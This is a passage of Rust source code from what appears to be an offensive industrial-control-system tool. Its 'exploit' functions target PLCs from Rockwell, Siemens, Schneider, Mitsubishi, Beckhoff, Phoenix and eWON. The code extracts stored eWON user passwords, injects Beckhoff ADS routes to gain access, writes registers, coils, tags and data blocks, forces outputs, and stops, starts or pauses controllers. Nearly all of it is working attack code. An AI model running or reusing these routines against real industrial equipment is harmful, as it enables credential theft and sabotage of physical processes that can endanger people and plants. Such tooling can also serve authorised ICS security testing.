        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_write_tag(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    let (tag_name, value) = input.split_once('=').unwrap_or((input, "0"));
    out(&format!("[*] Writing {tag_name}={value} on {ip}..."));
    match webvisit::write_tag_value(ip, tag_name, value) {
        Ok(_) => out(&format!("[+] Wrote {tag_name} = {value}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_info(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::control;
    out(&format!("[*] Getting device info from {ip}..."));
    match control::get_device_info(ip, false) {
        Ok(info) => {
            out(&format!("  PLC Type: {}", info.plc_type));
            if let Some(fw) = info.firmware { out(&format!("  Firmware: {fw}")); }
            if let Some(b) = info.build { out(&format!("  Build:    {b}")); }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_ewon_creds(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::ewon::exploit;
    let (username, max_str) = if input.is_empty() {
        ("adm", "20")
    } else {
        input.split_once(':').unwrap_or(("adm", "20"))
    };
    let max_users: u32 = max_str.trim().parse().unwrap_or(20);
    out(&format!("[*] Extracting credentials from {ip} (user={username}, slots={max_users})..."));
    match exploit::exploit(ip, username, max_users) {
        Ok(users) => {
            for u in &users {
                out(&format!(
                    "  {} ({} {}): {}",
                    u.username, u.first_name, u.last_name, u.password
                ));
                if !u.access_rights.is_empty() {
                    out(&format!("    Access: {}", u.access_rights));
                }
            }
            out(&format!("[+] {} user(s) extracted", users.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_rockwell_identity(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    out(&format!("[*] Getting device identity from {ip}..."));
    match driver::get_device_info(ip) {
        Ok(dev) => {
            out(&format!("  Vendor:       {}", dev.vendor));
            out(&format!("  Product Type: {}", dev.product_type));
            out(&format!("  Product Code: {}", dev.product_code));
            out(&format!("  Product Name: {}", dev.product_name));
            out(&format!("  Revision:     {}", dev.revision));
            out(&format!("  Serial:       {}", dev.serial));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_rockwell_tags(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    use std::collections::HashMap;

    out(&format!("[*] Enumerating tags on {ip}..."));
    let tags = match driver::enumerate_tags(ip) {
        Ok(t) => t,
        Err(e) => { out(&format!("[-] {e}")); return; }
    };
    out(&format!("[*] {} tags found — reading scalar values...", tags.len()));

    // Bulk-read all scalar (non-array, non-struct) tags in one session
    let scalar_names: Vec<&str> = tags
        .iter()
        .filter(|t| t.tag_type & 0x8000 == 0 && t.dimensions == 0)
        .map(|t| t.name.as_str())
        .collect();
    let raw_values = driver::read_tags_bulk(ip, &scalar_names);
    let value_map: HashMap<&str, String> = scalar_names
        .iter()
        .zip(raw_values.iter())
        .map(|(&name, opt)| {
            let val = match opt {
                Some(data) => driver::decode_value(
                    tags.iter().find(|t| t.name == name).map_or(0, |t| t.tag_type),
                    data,
                ),
                None => "-".to_string(),
            };
            (name, val)
        })
        .collect();

    let [hdr, sep] = tag_header();
    out(&hdr);
    out(&sep);
    for t in &tags {
        let (base, dims) = driver::type_parts(t.tag_type);
        let value = if t.tag_type & 0x8000 != 0 {
            "[struct]".to_string()
        } else if t.dimensions > 0 {
            "[array]".to_string()
        } else {
            value_map.get(t.name.as_str()).cloned().unwrap_or_else(|| "-".to_string())
        };
        out(&fmt_tag_row(t.instance_id as i64, &t.name, &base, dims, &value, t.tag_type as i64));
    }
    out(&sep);
    out(&format!("[+] {} tag(s)", tags.len()));
    save_tags_and_diff(ip, &tags, out);
}

fn save_tags_and_diff(
    ip: &str,
    tags: &[crate::vendors::rockwell::driver::LogixTag],
    out: &impl Fn(&str),
) {
    use crate::db::Database;
    use crate::vendors::rockwell::driver;
    match Database::open(&Database::default_path()) {
        Ok(db) => {
            let data: Vec<(i64, &str, i64)> = tags
                .iter()
                .map(|t| (t.instance_id as i64, t.name.as_str(), t.tag_type as i64))
                .collect();
            match db.upsert_tags(ip, &data) {
                Ok(diff) if diff.is_empty() => {
                    out("[*] Tags saved — no changes since last scan");
                }
                Ok(diff) => {
                    out(&format!(
                        "[!] Tag changes: +{} added  -{} removed  ~{} type-changed",
                        diff.added.len(),
                        diff.removed.len(),
                        diff.type_changed.len(),
                    ));
                    for t in &diff.added {
                        out(&format!("  [+NEW] {:<40} : {}", t.name, driver::type_name(t.tag_type as u16)));
                    }
                    for t in &diff.removed {
                        out(&format!("  [-DEL] {:<40} : {}", t.name, driver::type_name(t.tag_type as u16)));
                    }
                    for c in &diff.type_changed {
                        out(&format!(
                            "  [~CHG] {:<40} : {} \u{2192} {}",
                            c.name,
                            driver::type_name(c.old_type as u16),
                            driver::type_name(c.new_type as u16),
                        ));
                    }
                }
                Err(e) => out(&format!("[!] Tag save failed: {e}")),
            }
        }
        Err(e) => out(&format!("[!] Cannot open DB to save tags: {e}")),
    }
}

fn exploit_rockwell_monitor(ip: &str, out: &impl Fn(&str), stop: Arc<AtomicBool>) {
    use crate::vendors::rockwell::driver;
    use chrono::Local;

    out(&format!("[*] Tag monitor started for {ip}"));
    out("[*] Fetching baseline tags...");

    // Initial baseline scan
    match driver::enumerate_tags(ip) {
        Ok(tags) => {
            out(&format!("[+] Baseline: {} tags", tags.len()));
            save_tags_and_diff(ip, &tags, out);
        }
        Err(e) => {
            out(&format!("[-] Baseline fetch failed: {e}"));
            return;
        }
    }

    out("[*] Polling every 30 s — fire another exploit or close zoom to stop");

    for poll in 1u32.. {
        // Sleep 30 s in 1-second ticks so the stop flag is checked promptly
        for _ in 0..30 {
            if stop.load(Ordering::Relaxed) {
                out("[*] Monitor stopped");
                return;
            }
            std::thread::sleep(Duration::from_secs(1));
        }
        if stop.load(Ordering::Relaxed) {
            out("[*] Monitor stopped");
            return;
        }

        let ts = Local::now().format("%H:%M:%S").to_string();
        out(&format!("[*] Poll #{poll} at {ts}"));

        match driver::enumerate_tags(ip) {
            Ok(tags) => save_tags_and_diff(ip, &tags, out),
            Err(e)   => out(&format!("[-] Poll failed: {e}")),
        }
    }
}

fn exploit_rockwell_read(ip: &str, tag: &str, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    out(&format!("[*] Reading tag '{tag}' from {ip}..."));
    match driver::read_tag(ip, tag) {
        Ok(raw) => out(&format!("  {tag} = 0x{}", hex_fmt(&raw))),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_rockwell_write(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    let (tag_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
    let value_bytes: Vec<u8> = hex_val
        .as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    let type_code: u16 = if value_bytes.len() == 1 { 0x00C1 } else { 0x00C4 };
    match driver::write_tag(ip, tag_name, type_code, &value_bytes) {
        Ok(_) => out(&format!("[+] {tag_name}: written")),
        Err(e) => out(&format!("[-] {tag_name}: {e}")),
    }
}

fn exploit_mitsubishi_info(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::scan;
    out(&format!("[*] Getting Mitsubishi device info from {ip}..."));
    match scan::scan_ip(ip, 3, true) {
        Ok(devs) => {
            if devs.is_empty() {
                out("[-] No Mitsubishi device responded");
            }
            for d in &devs {
                out(&format!("  PLC Type: {}", d.plc_type));
                if let Some(title) = &d.title { out(&format!("  Title:    {title}")); }
                if let Some(comment) = &d.comment { out(&format!("  Comment:  {comment}")); }
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_mitsubishi_state(ip: &str, state: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::control;
    let iface = NetworkInterface {
        name: "auto".into(),
        ip: local_ip_for(ip),
        netmask: "255.255.255.0".into(),
        mac: None,
    };
    out(&format!("[*] Setting Mitsubishi to {state}..."));
    match control::set_state(&iface, state) {
        Ok(true) => out(&format!("[+] State set to {state}")),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Column headers ──────────────────────────────────────────────────────────

fn io_header() -> [String; 2] {
    [
        format!("  {:<10}  {:<4}  {:<5}  {}", "Address", "Bit", "Value", "Raw"),
        format!("  {:─<10}  {:─<4}  {:─<5}  {:─<3}", "", "", "", ""),
    ]
}

fn fmt_io_row(addr: &str, bit: &str, val: u8) -> String {
    let value_str = if val != 0 { "true " } else { "false" };
    format!("  {:<10}  {:<4}  {:<5}  {}", addr, bit, value_str, val)
}

fn modbus_header() -> [String; 2] {
    [
        format!("  {:<10}  {:<8}  {:<10}  {}", "Address", "Number", "Value", "Hex"),
        format!("  {:─<10}  {:─<8}  {:─<10}  {:─<6}", "", "", "", ""),
    ]
}

fn fmt_modbus_row(r: &crate::vendors::schneider::modbus::ModbusRegister) -> String {
    format!("  {:<10}  {:<8}  {:<10}  {:#06x}", r.address, r.display_addr, r.raw, r.raw)
}

fn slmp_header() -> [String; 2] {
    [
        format!("  {:<12}  {:<10}  {}", "Device", "Address", "Value"),
        format!("  {:─<12}  {:─<10}  {:─<8}", "", "", ""),
    ]
}

fn fmt_slmp_row(v: &crate::vendors::mitsubishi::slmp::SlmpValue) -> String {
    format!("  {:<12}  {:<10}  {}", v.display, v.raw, v.value_str)
}

fn ads_symbol_header() -> [String; 2] {
    [
        format!("  {:<48}  {:<14}  {:<20}  {}", "Name", "Type", "Value", "Size"),
        format!("  {:─<48}  {:─<14}  {:─<20}  {:─<8}", "", "", "", ""),
    ]
}

fn fmt_ads_symbol_row(name: &str, type_name: &str, value: &str, size: u32) -> String {
    format!("  {:<48}  {:<14}  {:<20}  {size} B", name, type_name, value)
}

// ─── DB save + diff helpers ──────────────────────────────────────────────────

fn save_and_diff(ip: &str, protocol: &str, points: &[(&str, Option<&str>, &str)], out: &impl Fn(&str)) {
    use crate::db::Database;
    let db = match Database::open(&Database::default_path()) {
        Ok(d) => d,
        Err(e) => { out(&format!("[!] Cannot open DB: {e}")); return; }
    };
    match db.upsert_data_points(ip, protocol, points) {
        Ok(diff) if diff.is_empty() => out("[*] Saved — no changes since last scan"),
        Ok(diff) => {
            out(&format!(
                "[!] Changes: +{} added  -{} removed  ~{} value-changed",
                diff.added.len(), diff.removed.len(), diff.value_changed.len(),
            ));
            for c in &diff.value_changed {
                let old = c.old_value.as_deref().unwrap_or("-");
                out(&format!("  [~CHG] {:<36} : {} \u{2192} {}", c.address, old, c.new_value));
            }
        }
        Err(e) => out(&format!("[!] DB save failed: {e}")),
    }
}

// ─── New Beckhoff exploits ───────────────────────────────────────────────────

fn exploit_beckhoff_get_state(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Reading TwinCAT runtime state from {ip}..."));
    match scan::discover_ip(ip, 3, true).ok()
        .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
    {
        Some(dev) => out(&format!("[+] State: {}", scan::get_state(&dev, &local_netid))),
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_add_route(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_ip = local_ip_for(ip);
    let local_netid = ads::build_local_netid(&local_ip);
    let (username, password) = input.split_once(':').unwrap_or((input, "1"));
    out(&format!("[*] Injecting ADS route on {ip} for user '{username}'..."));
    match scan::discover_ip(ip, 3, true).ok()
        .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
    {
        Some(dev) => {
            if scan::add_route(&dev, &local_ip, &local_netid, username, password, Some("scadaver")) {
                out("[+] Route added — this host now has ADS access to the PLC");
            } else {
                out("[-] Route injection failed (wrong credentials or device denied)");
            }
        }
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_symbols(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Enumerating ADS symbols on {ip}..."));
    let Some(dev) = scan::discover_ip(ip, 3, true).ok()
        .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
    else {
        out("[-] No Beckhoff device responded");
        return;
    };
    let symbols = scan::enumerate_symbols(&dev, &local_netid);
    if symbols.is_empty() {
        out("[-] No symbols returned (device may not support ADS symbol upload)");
        return;
    }
    let [hdr, sep] = ads_symbol_header();
    out(&hdr);
    out(&sep);
    for s in &symbols {
        let value = s.value_str.as_deref().unwrap_or("-");
        out(&fmt_ads_symbol_row(&s.name, &s.type_name, value, s.size));
    }
    out(&sep);
    out(&format!("[+] {} symbol(s)", symbols.len()));
    let points: Vec<(&str, Option<&str>, &str)> = symbols
        .iter()
        .filter(|s| s.value_str.is_some())
        .map(|s| (s.name.as_str(), Some(s.type_name.as_str()), s.value_str.as_deref().unwrap()))
        .collect();
    save_and_diff(ip, "ads", &points, out);
}

// ─── New Siemens exploits ────────────────────────────────────────────────────

fn exploit_siemens_set_outputs(ip: &str, input: &str, out: &impl Fn(&str)) {
    let (args, pw) = match input.split_once("|pw=") {
        Some((a, p)) => (a.trim(), Some(p.trim())),
        None => (input.trim(), None),
    };
    use crate::vendors::siemens::s7comm;
    out(&format!("[*] Writing outputs '{args}' to {ip}..."));
    if s7comm::set_outputs(ip, args, 102, 5, pw) {
        out("[+] Outputs written");
    } else {
        out("[-] Write failed");
    }
}

fn exploit_siemens_set_merkers(ip: &str, input: &str, out: &impl Fn(&str)) {
    let (args, pw) = match input.split_once("|pw=") {
        Some((a, p)) => (a.trim(), Some(p.trim())),
        None => (input.trim(), None),
    };
    use crate::vendors::siemens::s7comm;
    let (bits, offset_s) = args.split_once(':').unwrap_or((args, "0"));
    let offset = offset_s.trim().parse::<u32>().unwrap_or(0);
    out(&format!("[*] Writing merkers '{bits}' at offset {offset} to {ip}..."));
    if s7comm::set_merkers(ip, bits, offset, 102, 5, pw) {
        out("[+] Merkers written");
    } else {
        out("[-] Write failed");
    }
}

fn exploit_siemens_list_dbs(ip: &str, input: &str, out: &impl Fn(&str)) {
    let pw = input.split_once("|pw=").map(|(_, p)| p.trim());
    use crate::vendors::siemens::s7comm;
    out(&format!("[*] Scanning DB1..200 on {ip} (may take a moment)..."));
    let blocks = s7comm::list_data_blocks(ip, 102, 5, pw);
    if blocks.is_empty() {
        out("[-] No readable data blocks found");
        return;
    }
    out(&format!("  {:<8}  {}", "Block", "Bytes read"));
    out(&format!("  {:─<8}  {:─<10}", "", ""));
    for (db_num, size) in &blocks {
        out(&format!("  {:<8}  {size}", format!("DB{db_num}")));
    }
    out(&format!("[+] {} data block(s) found", blocks.len()));
}

fn exploit_siemens_read_db(ip: &str, input: &str, out: &impl Fn(&str)) {
    let (args, pw) = match input.split_once("|pw=") {
        Some((a, p)) => (a.trim(), Some(p.trim())),
        None => (input.trim(), None),
    };
    use crate::vendors::siemens::s7comm;
    let parts: Vec<&str> = args.splitn(3, ':').collect();
    let db_str = parts.first().copied().unwrap_or("DB1");
    let db_num = db_str.trim_start_matches(|c: char| c.is_alphabetic())
        .parse::<u16>().unwrap_or(1);
    let offset = parts.get(1).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
    let length = parts.get(2).and_then(|s| s.parse::<u16>().ok()).unwrap_or(64).min(240);
    out(&format!("[*] Reading DB{db_num} offset={offset} len={length} from {ip}..."));
    match s7comm::read_data_block(ip, db_num, offset, length, 102, 5, pw) {
        Ok(data) => {
            for line in hex_dump_lines(&data, offset) {
                out(&line);
            }
            out(&format!("[+] {} bytes", data.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn hex_dump_lines(data: &[u8], base_offset: u16) -> Vec<String> {
    data.chunks(16).enumerate().map(|(i, chunk)| {
        let offset = base_offset as usize + i * 16;
        let hex: String = chunk.iter().map(|b| format!("{b:02x} ")).collect();
        let ascii: String = chunk.iter()
            .map(|&b| if b.is_ascii_graphic() { b as char } else { '.' })
            .collect();
        format!("  {:04x}  {:<48}  {ascii}", offset, hex)
    }).collect()
}

// ─── New Schneider/Modbus exploits ───────────────────────────────────────────

fn exploit_modbus_holding(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
    out(&format!("[*] Reading {count} holding registers from {ip} (start={start})..."));
    match modbus::read_holding_registers(ip, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr); out(&sep);
            for r in &regs { out(&fmt_modbus_row(r)); }
            out(&sep);
            out(&format!("[+] {} register(s)", regs.len()));
            let addrs: Vec<String> = regs.iter().map(|r| r.display_addr.to_string()).collect();
            let vals: Vec<String> = regs.iter().map(|r| r.raw.to_string()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs.iter().zip(vals.iter())
                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str())).collect();
            save_and_diff(ip, "modbus", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_coils(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
    out(&format!("[*] Reading {count} coils from {ip} (start={start})..."));
    match modbus::read_coils(ip, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr); out(&sep);
            for r in &regs { out(&fmt_modbus_row(r)); }
            out(&sep);
            out(&format!("[+] {} coil(s)", regs.len()));
            let addrs: Vec<String> = regs.iter().map(|r| r.display_addr.to_string()).collect();
            let vals: Vec<String> = regs.iter().map(|r| r.value_str.clone()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs.iter().zip(vals.iter())
                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str())).collect();
            save_and_diff(ip, "modbus", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_input(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
    out(&format!("[*] Reading {count} input registers from {ip} (start={start})..."));
    match modbus::read_input_registers(ip, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr); out(&sep);
            for r in &regs { out(&fmt_modbus_row(r)); }
            out(&sep);
            out(&format!("[+] {} register(s)", regs.len()));
            let addrs: Vec<String> = regs.iter().map(|r| r.display_addr.to_string()).collect();
            let vals: Vec<String> = regs.iter().map(|r| r.raw.to_string()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs.iter().zip(vals.iter())
                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str())).collect();
            save_and_diff(ip, "modbus", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── New Phoenix exploits ────────────────────────────────────────────────────

fn exploit_phoenix_control_ilc150(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::control;
    let (action, start_type) = input.split_once(':').unwrap_or((input, "cold"));
    out(&format!("[*] Sending ILC150 '{action}' command to {ip}..."));
    match control::control_ilc150(ip, action, start_type) {
        Ok(state) => out(&format!("[+] PLC state: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_control_ilc390(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::control;
    out(&format!("[*] Sending ILC390 '{input}' command to {ip}..."));
    match control::control_ilc390(ip, input) {
        Ok(state) => out(&format!("[+] PLC state: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── New Mitsubishi exploits ─────────────────────────────────────────────────

fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::control;
    let iface = NetworkInterface {
        name: "auto".into(),
        ip: local_ip_for(ip),
        netmask: "255.255.255.0".into(),
        mac: None,
    };
    out(&format!("[*] Setting Mitsubishi to pause on {ip}..."));
    match control::set_state(&iface, "pause") {
        Ok(true) => out("[+] State set to pause"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_mitsubishi_read_d(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "50"));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(50).min(960);
    let end = start.saturating_add(count as u32).saturating_sub(1);
    out(&format!("[*] Reading D{start}..D{end} from {ip}..."));
    match slmp::read_word_devices(ip, "D", start, count) {
        Ok(vals) => {
            let [hdr, sep] = slmp_header();
            out(&hdr); out(&sep);
            for v in &vals { out(&fmt_slmp_row(v)); }
            out(&sep);
            out(&format!("[+] {} word(s)", vals.len()));
            let addrs: Vec<String> = vals.iter().map(|v| v.display.clone()).collect();
            let strs: Vec<String> = vals.iter().map(|v| v.raw.to_string()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs.iter().zip(strs.iter())
                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str())).collect();
            save_and_diff(ip, "slmp", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_mitsubishi_read_m(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(3584);
    let end = start.saturating_add(count as u32).saturating_sub(1);
    out(&format!("[*] Reading M{start}..M{end} from {ip}..."));
    match slmp::read_bit_devices(ip, "M", start, count) {
        Ok(vals) => {
            let [hdr, sep] = slmp_header();
            out(&hdr); out(&sep);
            for v in &vals { out(&fmt_slmp_row(v)); }
            out(&sep);
            out(&format!("[+] {} bit(s)", vals.len()));
            let addrs: Vec<String> = vals.iter().map(|v| v.display.clone()).collect();
            let strs: Vec<String> = vals.iter().map(|v| v.value_str.clone()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs.iter().zip(strs.iter())
                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str())).collect();
            save_and_diff(ip, "slmp", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Modbus write exploits ────────────────────────────────────────────────────

fn exploit_modbus_write_coil(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (addr_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
    let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
    let on = !state_s.trim().eq_ignore_ascii_case("off");
    out(&format!("[*] Writing coil {addr} = {} on {ip}...", if on { "ON" } else { "OFF" }));
    match modbus::write_single_coil(ip, addr, on) {
        Ok(()) => out(&format!("[+] Coil {addr} written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_write_register(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (addr_s, val_s) = input.split_once(':').unwrap_or((input, "0"));
    let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
    let value = val_s.trim().parse::<u16>().unwrap_or(0);
    out(&format!("[*] Writing register {addr} = {value} on {ip}..."));
    match modbus::write_single_register(ip, addr, value) {
        Ok(()) => out(&format!("[+] Register {addr} written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_write_registers(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid register values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!("[*] Writing {} registers starting at {start} on {ip}...", values.len()));
    match modbus::write_multiple_registers(ip, start, &values) {
        Ok(n) => out(&format!("[+] {n} register(s) written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Schneider FC90 exploits ──────────────────────────────────────────────────

fn exploit_fc90_stop(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 STOP command to {ip} (M340/Quantum/Premium)..."));
    match modicon_fc90::stop_plc(ip) {
        Ok(true) => out("[+] PLC stopped (ack received)"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_start(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 START command to {ip} (M340/Quantum/Premium)..."));
    match modicon_fc90::start_plc(ip) {
        Ok(true) => out("[+] PLC started (ack received)"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_stop_tm221(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 STOP TM221 to {ip}..."));
    match modicon_fc90::stop_tm221(ip) {
        Ok(true) => out("[+] TM221 stopped"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_start_tm221(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 START TM221 to {ip}..."));
    match modicon_fc90::start_tm221(ip) {
        Ok(true) => out("[+] TM221 started"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_force(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90::{self, ForceState};
    let (byte_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
    let output_byte = u8::from_str_radix(byte_s.trim().trim_start_matches("0x"), 16)
        .unwrap_or(0x11);
    let state = match state_s.trim().to_lowercase().as_str() {
        "off" => ForceState::Off,
        "unforce" => ForceState::Unforce,
        _ => ForceState::On,
    };
    out(&format!("[*] FC90 Force output 0x{output_byte:02x} to {state_s} on {ip}..."));
    match modicon_fc90::force_output_bit(ip, output_byte, state) {
        Ok(true) => out("[+] Force command sent"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── SLMP write exploits ──────────────────────────────────────────────────────

fn exploit_slmp_write_d(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!("[*] Writing {} D registers starting at D{start} on {ip}...", values.len()));
    match slmp::write_word_devices(ip, "D", start, &values) {
        Ok(()) => out("[+] D registers written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_slmp_write_m(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, bits_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let values: Vec<bool> = bits_s
        .trim()
        .chars()
        .filter_map(|c| match c {
            '0' => Some(false),
            '1' => Some(true),
            _ => None,
        })
        .collect();
    if values.is_empty() {
        out("[-] No valid bits provided (format: start:0101...)");
        return;
    }
    out(&format!("[*] Writing {} M bits starting at M{start} on {ip}...", values.len()));
    match slmp::write_bit_devices(ip, "M", start, &values) {
        Ok(()) => out("[+] M bits written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Siemens DB write exploit ─────────────────────────────────────────────────

fn exploit_siemens_write_db(ip: &str, input: &str, out: &impl Fn(&str)) {
    let (args, pw) = match input.split_once("|pw=") {
        Some((a, p)) => (a.trim(), Some(p.trim())),
        None => (input.trim(), None),
    };
    use crate::vendors::siemens::s7comm;
    let parts: Vec<&str> = args.splitn(3, ':').collect();
    let db_str = parts.first().copied().unwrap_or("DB1");
    let db_num = db_str.trim_start_matches(|c: char| c.is_alphabetic())
        .parse::<u16>().unwrap_or(1);
    let offset = parts.get(1).and_then(|s| s.parse::<u16>().ok()).unwrap_or(0);
    let hex_data = parts.get(2).copied().unwrap_or("");
    let data: Vec<u8> = hex_data.as_bytes().chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    if data.is_empty() {
        out("[-] No data to write (format: DB1:offset:hexbytes[|pw=password])");
        return;
    }
    out(&format!("[*] Writing {} byte(s) to DB{db_num}:{offset} on {ip}...", data.len()));
    match s7comm::write_data_block(ip, db_num, offset, &data, 102, 5, pw) {
        Ok(true) => out("[+] DB write acknowledged"),
